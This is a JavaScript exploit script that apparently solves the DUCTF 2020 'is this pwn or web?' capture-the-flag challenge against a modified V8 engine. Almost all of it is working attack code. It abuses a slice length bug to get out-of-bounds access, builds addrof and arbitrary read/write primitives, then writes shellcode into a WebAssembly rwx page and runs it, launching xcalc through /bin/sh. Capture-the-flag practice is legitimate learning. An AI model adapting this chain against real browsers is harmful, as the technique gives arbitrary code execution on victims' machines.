//
// Solution for DUCTF 2020 'is this pwn or web?' challenge.
//

var bytes   = new ArrayBuffer(8);
var f64_buf = new Float64Array(bytes);
var u64_buf = new BigUint64Array(bytes);

function f64_to_u64(val) {
    f64_buf[0] = val;
    return u64_buf[0];
}

function u64_to_f64(val) {
    u64_buf[0] = val;
    return f64_buf[0];
}

// Corrupt `oob_arr` to access out of bounds.
//
// - return ExtractFastJSArray(context, a, start, count);
// + const array: JSArray = ExtractFastJSArray(context, a, start, count);
// + const newLength: Smi = Cast<Smi>(count - start + SmiConstant(2))
// +     otherwise Bailout;
// + array.ChangeLength(newLength);
//
// Slicing an array causes length to be increased by 2 more than expected,
// giving us out-of-bounds access to memory up to 16 bytes below the array.
var oob_arr = [1.1];
oob_arr = oob_arr.slice(0, 1);
console.assert(oob_arr.length == 3);

// Allocate `obj_arr` and `rw_arr` below corrupted `oob_arr`, so we can
// modify their objects in-memory later.
var obj_arr = [{}];
var rw_arr  = [2.2];

// Set length of `oob_arr` to large number, giving us access to all
// memory below our out-of-bounds array.
oob_arr_elem = f64_to_u64(oob_arr[2]) & 0xffffffffn;
oob_arr[2] = u64_to_f64(((1000n << 1n) << 32n) + oob_arr_elem);
console.assert(oob_arr.length == 1000);

// Our 'addrof' primitive is pretty simple, we place some object
// at the first index of an object array stored below our `oob_arr` and
// the compressed pointer to that object will be stored in the lower
// 32-bits of `oob_arr[4]`.
function addrof(obj) {
    obj_arr[0] = obj;
    return (f64_to_u64(oob_arr[4]) & 0xffffffffn) - 1n;
}

// The arbitrary read primitive is also fairly straight-forward, we
// overwrite the 'elements' pointer of our `rw_arr` object to point to
// an arbitrary address, then we read from that `rw_arr[0]`.
//
// Keep in mind we need to subtract 8 from the address provided, as the
// 'elements' store starts with 8 bytes of metadata.
function arb_read_u64(addr) {
    // replace 'elements' pointer
    var rw_arr_len = f64_to_u64(oob_arr[13]) >> 32n;
    oob_arr[13] = u64_to_f64((rw_arr_len << 32n) + (addr - 8n + 1n)); 

    // read qword from `rw_arr[0]`
    return f64_to_u64(rw_arr[0]); 
}

// Our arbitrary write is just the same as our read, but in reverse,
// instead of reading from `rw_arr[0]` we assign a value to it.
function arb_write_u64(addr, val) {
    // replace 'elements' pointer for `rw_arr` with compressed pointer `addr`
    var rw_arr_len = f64_to_u64(oob_arr[13]) >> 32n;
    oob_arr[13] = u64_to_f64((rw_arr_len << 32n) + (addr - 8n + 1n)); 
    
    // write qword to `rw_arr[0]`
    rw_arr[0] = u64_to_f64(val);
}

// Arbitrary-length write with an uncompressed address. Necessary for
// writing our shellcode to rwx memory.
function write_bytes(addr, data) {
    var buf  = new ArrayBuffer(data.length);
    var view = new DataView(buf);

    // replace backing store for `buf` with 64-bit pointer `addr`
    var buf_bck_store = addrof(buf) + 0x14n;
    arb_write_u64(buf_bck_store, addr);

    // copy byte array to address
    for (var i = 0; i < data.length; ++i) {
        view.setUint8(i, data[i]);
    }
}

// Placeholder wasm code, contains a `main` function. 
// `int main() { return 42; }`
var wasm_code = new Uint8Array([
    0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,
    0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,
    0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,
    10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11
]);

var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var wasm_entry = wasm_instance.exports.main;

// Find address to wasm rwx page used to store bytecode.
var rwx_page = arb_read_u64(addrof(wasm_instance) + 0x68n);

// msfvenom -p linux/x64/exec CMD="DISPLAY=':0.0' xcalc" -f csharp
var shellcode = new Uint8Array([
    0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x99,0x50,0x54,0x5f,0x52,
    0x66,0x68,0x2d,0x63,0x54,0x5e,0x52,0xe8,0x15,0x00,0x00,0x00,0x44,0x49,0x53,
    0x50,0x4c,0x41,0x59,0x3d,0x27,0x3a,0x30,0x2e,0x30,0x27,0x20,0x78,0x63,0x61,
    0x6c,0x63,0x00,0x56,0x57,0x54,0x5e,0x6a,0x3b,0x58,0x0f,0x05
]);

// Write shellcode to rwx page and call wasm entrypoint.
write_bytes(rwx_page, shellcode);
wasm_entry();

